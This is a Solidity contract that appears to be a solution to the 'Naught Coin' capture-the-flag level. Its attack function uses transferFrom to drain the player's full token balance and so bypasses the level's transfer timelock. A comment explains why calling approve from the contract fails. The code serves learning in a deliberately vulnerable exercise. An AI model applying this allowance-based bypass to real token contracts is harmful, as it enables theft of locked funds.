// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {NaughtCoin} from "./Naught_coin.sol";


contract Attack {
    NaughtCoin naught_coin;

    constructor(NaughtCoin _naught_coin) {
        naught_coin = _naught_coin ;
    }

    function attack() public {
        // naught_coin.approve(address(this), naught_coin.balanceOf(naught_coin.player())); 
        //stupid ...dont do this cause is being called by the attack contract, not the player
        naught_coin.transferFrom(naught_coin.player(), address(this), naught_coin.balanceOf(naught_coin.player()));
    }
}
